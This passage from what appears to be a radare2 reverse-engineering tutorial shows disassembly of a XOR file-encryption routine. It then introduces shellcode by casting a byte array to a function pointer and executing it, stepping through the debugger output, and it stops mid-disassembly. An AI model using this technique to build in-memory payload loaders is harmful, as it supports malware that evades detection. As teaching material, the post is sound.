<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b4a</span>      <span class="mi">4889</span><span class="n">d6</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b4d</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b50</span>      <span class="n">e83bffffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">cryp</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b55</span>      <span class="mi">488</span><span class="n">d4ded</span>       <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b59</span>      <span class="mi">8</span><span class="n">b45e8</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b5c</span>      <span class="n">ba0b000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="p">;</span> <span class="mi">11</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b61</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b64</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b66</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b6b</span>      <span class="n">e870fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">write</span>      <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">)</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">crypFile</span> <span class="err">@</span> <span class="mh">0x55fa6e273b40</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273b70</span>      <span class="mi">488</span><span class="n">d4ded</span>       <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b74</span>      <span class="mi">8</span><span class="n">b45e4</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_1ch</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b77</span>      <span class="n">ba0b000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="p">;</span> <span class="mi">11</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b7c</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b7f</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b81</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b86</span>      <span class="n">e8a5fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b8b</span>      <span class="mi">85</span><span class="n">c0</span>           <span class="n">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273b8d</span>      <span class="mi">75</span><span class="n">b3</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273b42</span>
</code></pre></div></div>
<p>And cryp goes char by char KSIZE chars and does the XOR with the key</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x00000aa5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aa8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aab</span>      <span class="mi">488</span><span class="n">b45e0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aaf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab2</span>      <span class="mi">0</span><span class="n">fb630</span>         <span class="n">movzx</span> <span class="n">esi</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000abb</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000abf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac2</span>      <span class="mi">0</span><span class="n">fb608</span>         <span class="n">movzx</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000acb</span>      <span class="mi">488</span><span class="n">b45e0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000acf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad2</span>      <span class="mi">31</span><span class="n">ce</span>           <span class="n">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">ecx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad4</span>      <span class="mi">89</span><span class="n">f2</span>           <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esi</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad6</span>      <span class="mi">8810</span>           <span class="n">mov</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span> <span class="n">dl</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad8</span>      <span class="mi">8345</span><span class="n">fc01</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">cryp</span> <span class="err">@</span> <span class="mh">0xaa3</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x00000adc</span>      <span class="mi">837</span><span class="n">dfc0a</span>       <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x00000ae0</span>      <span class="mi">7</span><span class="n">ec3</span>           <span class="n">jle</span> <span class="mh">0xaa5</span>
</code></pre></div></div>
<p>Voilà!</p>

<p>Let’s now move into a new topic that I think may be of great interest.</p>

<h3 id="downloading-and-executing-code-in-memory">Downloading and executing code in memory</h3>

<h4 id="intro-to-shellcode">Intro to shellcode</h4>

<p>This post is not about shellcode writting, we’ll go over that after some tutorials though. In here we’ll just introduce you to a new concept linked to the socket topic whe are dealing wiht.</p>

<p>Let’s start with this very simple program:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">void</span> <span class="nf">hello</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">h</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"hello world"</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">hello</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It contains a couple of functions right. One is the classical main function, the other one just prints the hello world. Let’s inspect this second one:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x7f4653774090</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">s</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span>
<span class="p">[</span><span class="mh">0x5561e0c6c6aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x5561e0c6c707</span>
<span class="err">┌</span> <span class="mi">84</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span> <span class="p">();</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_14h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x14</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6aa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ab</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ae</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6b2</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6bb</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6bf</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6c1</span>      <span class="mi">48</span><span class="n">b868656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6f77206f6c6c6568</span> <span class="p">;</span> <span class="err">'</span><span class="n">hello</span> <span class="n">wo</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6cb</span>      <span class="mi">488945</span><span class="n">ec</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6cf</span>      <span class="n">c745f4726c64</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mh">0x646c72</span> <span class="p">;</span> <span class="err">'</span><span class="n">rld</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6d6</span>      <span class="mi">488</span><span class="n">d45ec</span>       <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6da</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6dd</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e2</span>      <span class="n">e899feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e7</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e8</span>      <span class="mi">488</span><span class="n">b45f8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ec</span>      <span class="mi">644833042528</span><span class="p">.</span>  <span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x5561e0c6c6f5</span>      <span class="mi">7405</span>           <span class="n">je</span> <span class="mh">0x5561e0c6c6fc</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="mh">0x5561e0c6c6f7</span>      <span class="n">e874feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span> <span class="p">;</span> <span class="kt">void</span> <span class="n">__stack_chk_fail</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x5561e0c6c6fc</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x5561e0c6c6fd</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x5561e0c6c6aa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>As you can see, everyting is kind of “self-contained” inside this function. The string is “generated” and loaded inside the function, original register/stack values regarding to the calling block of code are kept/restored and calls (to printf) reference symbols that will be “common” in unix systems…</p>

<p>As you see the string is self generated in memory, would it be any way to self generate actual code in memory in a similar way?</p>

<p><em>indeed</em></p>

<p>If you look at the disasm, you’ll see the opcodes right in the second column, that is essence of the binary program, that is what the “cpu” sees and deals with, so if we can just set a buffer containing the right set of opcodes in memory and manage to move the execution pointer there, common sense tells us that those will be executed as actual code. Again, we’ll go in-depth on the topic further in the course but I think you get the main idea now.</p>

<p>Let’s look at one simple example then go back to our hello world</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include&lt;string.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">b2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">b2</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    
<span class="p">}</span>
</code></pre></div></div>
<p>So this program declares an array of (hex) bytes then declares a magic function that will basically set the instruction pointer at the beginning of the array. Let’s see it inside r2, it will make more sense.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x557a8fb2950d</span>
<span class="err">┌</span> <span class="mi">33</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fb</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fe</span>      <span class="mi">4883</span><span class="n">ec10</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29602</span>      <span class="mi">488</span><span class="n">d059b0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="n">b2</span>         <span class="p">;</span> <span class="mh">0x557a8fb296a4</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29609</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x557a8fb2960d</span>      <span class="mi">488</span><span class="n">b55f8</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29611</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29616</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29618</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29619</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x557a8fb2961a</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>If you know a bit about asm and opcodes you’ll see that 0x90 is the opcode for the nop instruction, the nop instruction simply does nothing.</p>

<p>The program starts by moving the pointer to an address to rax = 0x557a8fb296a4</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x557a8fb296a4</span>
<span class="mh">0x557a8fb296a4</span>  <span class="mh">0x90909090</span> <span class="mh">0x3b031b01</span> <span class="mh">0x0000003c</span> <span class="mh">0x00000006</span>  <span class="p">.......;</span><span class="o">&lt;</span><span class="p">.......</span>
</code></pre></div></div>
<p>And that contains our nop-buffer. After a couple of instructions the programm will jump there by a call.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29616</span> <span class="n">b</span>    <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29618</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29619</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x557a8fb2961a</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x557a8fb29616</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dr</span> <span class="n">rdx</span>
<span class="mh">0x557a8fb296a4</span>
</code></pre></div></div>
<p>And as the bytes of our hex buffer can easily be translated to instructions, the program will “read it” as executable code as you see here:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb29616</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">ds</span>
<span class="p">[</span><span class="mh">0x557a8fb296a4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">10</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x557a8fb29602</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">b2</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
            <span class="mh">0x557a8fb296a4</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a5</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a6</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a7</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">section</span><span class="p">..</span><span class="n">eh_frame_hdr</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">segment</span><span class="p">.</span><span class="n">GNU_EH_FRAME</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="p">.</span><span class="n">eh_frame_hdr</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">__GNU_EH_FRAME_HDR</span><span class="o">:</span>
            <span class="mh">0x557a8fb296a8</span>      <span class="mo">011</span><span class="n">b</span>           <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rbx</span><span class="p">],</span> <span class="n">ebx</span>    <span class="p">;</span> <span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="n">section</span> <span class="n">size</span> <span class="mi">60</span> <span class="n">named</span> <span class="p">.</span><span class="n">eh_frame_hdr</span>
            <span class="mh">0x557a8fb296aa</span>      <span class="mo">033</span><span class="n">b</span>           <span class="n">add</span> <span class="n">edi</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
            <span class="mh">0x557a8fb296ac</span>      <span class="mi">3</span><span class="n">c00</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mi">0</span>
</code></pre></div></div>
<p>Nops will be executed and then the weird add dword [rbx], ebx  that corresponds to some weird memory initialization will be executed, as the code below there does not make any sense because of that, the program will likely crash, but you get the point right? What if we manage to create an hex buffer that actually represents a valid function, a function that gets rid of the stack and returns to the calling one?</p>

<p>Let’s do it so,</p>

<p>As in the previous program the hello function was somehow “self-contained” we can “convert-it into shellcode”</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x55ef09605707</span>
<span class="err">┌</span> <span class="mi">84</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span> <span class="p">();</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_14h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x14</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x55ef096056aa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ab</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ae</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="err">│</span>           <span class="mh">0x55ef096056b2</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056bb</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056bf</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
